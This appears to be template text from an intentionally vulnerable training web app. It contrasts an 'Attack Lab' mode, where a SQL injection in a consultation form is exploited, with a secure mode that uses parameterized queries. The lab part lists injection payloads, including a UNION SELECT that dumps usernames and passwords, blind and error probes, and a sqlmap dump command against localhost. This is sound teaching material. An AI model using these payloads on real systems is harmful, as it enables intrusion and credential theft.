Attack Lab — INSERT + UNION Injection

The consultation form builds its INSERT and SELECT queries by concatenating user input directly. Inject into any field.

INSERT query (name field):

INSERT INTO consultations (name, phone, message) VALUES ('{name}', '{phone}', '{message}')

SELECT read-back query (name field):

SELECT * FROM consultations WHERE name = '{name}'

Attack payloads — paste into Name field:

  • ' UNION SELECT 1, username, password, role FROM users --
  • ' ORDER BY 100 --
  • test' AND '1'='1
  • test' AND '1'='2
  • test' AND randomblob(100000000) AND '1'='1

UNION attack: Submit the UNION payload in the Name field with any phone/message. The response will show exposed user credentials (username / password / role) from the database.

Error-based: Use ' ORDER BY 100 -- to trigger a visible SQL error (column count mismatch).

SQLMap:
sqlmap -u "http://127.0.0.1:5000/consult" --data="name=test&phone=123&message=hi" --method=POST --dump

{% else %}
Defense Active — Parameterized Queries

In Secure Mode, all three fields are bound as parameters. Input is escaped automatically by SQLite — no injection is possible.

INSERT INTO consultations (name, phone, message) VALUES (?, ?, ?) -- Each ? is bound separately; ' characters cannot escape the string

Additionally, input validation enforces field length limits before the query runs.
